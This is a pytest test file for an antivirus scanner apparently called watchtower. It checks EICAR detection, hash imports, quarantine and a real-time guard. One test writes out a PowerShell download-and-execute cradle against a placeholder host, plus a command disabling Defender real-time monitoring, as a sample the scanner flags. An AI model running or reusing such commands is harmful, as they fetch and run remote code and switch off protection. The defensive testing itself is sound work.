import os
import time

import pytest

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


@pytest.fixture()
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("WATCHTOWER_HOME", str(tmp_path / "home"))
    import importlib
    import watchtower.config as cfg
    importlib.reload(cfg)
    for m in ("signatures", "yara_engine", "scanner", "quarantine", "monitor"):
        importlib.reload(importlib.import_module(f"watchtower.{m}"))
    from watchtower.scanner import Scanner
    from watchtower.quarantine import Quarantine
    return tmp_path, Scanner(), Quarantine()


def test_eicar_detected(env):
    tmp, sc, _ = env
    f = tmp / "eicar.com"
    f.write_bytes(EICAR)
    r = sc.scan_file(f)
    assert r.verdict == "malicious" and "EICAR" in r.threat


def test_clean_file(env):
    tmp, sc, _ = env
    f = tmp / "notes.txt"
    f.write_text("shopping list: milk, eggs")
    assert sc.scan_file(f).verdict == "clean"


def test_powershell_cradle(env):
    tmp, sc, _ = env
    f = tmp / "a.ps1"
    f.write_text("IEX (New-Object Net.WebClient).DownloadString('http://x/y')\n"
                 "Set-MpPreference -DisableRealtimeMonitoring $true")
    r = sc.scan_file(f)
    assert r.verdict == "malicious", r.reasons


def test_double_extension(env):
    tmp, sc, _ = env
    f = tmp / "invoice.pdf.exe"
    f.write_bytes(b"not really a pe")
    r = sc.scan_file(f)
    assert any("double extension" in x for x in r.reasons)


def test_hash_import(env):
    tmp, sc, _ = env
    f = tmp / "sample.bin"
    f.write_bytes(b"pretend malware body")
    import hashlib
    h = hashlib.sha256(f.read_bytes()).hexdigest()
    lst = tmp / "hashes.txt"
    lst.write_text(f"# feed\n{h},Trojan.Test\n")
    assert sc.sigdb.import_file(lst) == 1
    r = sc.scan_file(f)
    assert r.verdict == "malicious" and r.threat == "Trojan.Test"


def test_tree_scan_and_quarantine_roundtrip(env):
    tmp, sc, q = env
    d = tmp / "tree"
    (d / "sub").mkdir(parents=True)
    (d / "sub" / "eicar.txt").write_bytes(EICAR)
    (d / "ok.txt").write_text("hello")
    stats = sc.scan_paths([d])
    assert stats.scanned == 2 and len(stats.threats) == 1
    t = stats.threats[0]
    item = q.add(t.path, t.threat, t.sha256)
    assert not os.path.exists(t.path)
    stored = (q.root / f"{item.id}.bin").read_bytes()
    assert EICAR not in stored                      # obfuscated at rest
    q.restore(item.id)
    assert open(t.path, "rb").read() == EICAR
    assert q.list() == []


def test_realtime_guard(env):
    tmp, sc, q = env
    from watchtower.monitor import RealTimeGuard
    watch = tmp / "downloads"
    watch.mkdir()
    hits = []
    g = RealTimeGuard(sc, q, on_threat=hits.append, paths=[watch])
    g.start()
    try:
        (watch / "dropper.com").write_bytes(EICAR)
        for _ in range(40):
            if hits:
                break
            time.sleep(0.25)
    finally:
        g.stop()
    assert hits and "auto-quarantined" in hits[0].reasons
    assert not (watch / "dropper.com").exists()
    assert len(q.list()) == 1
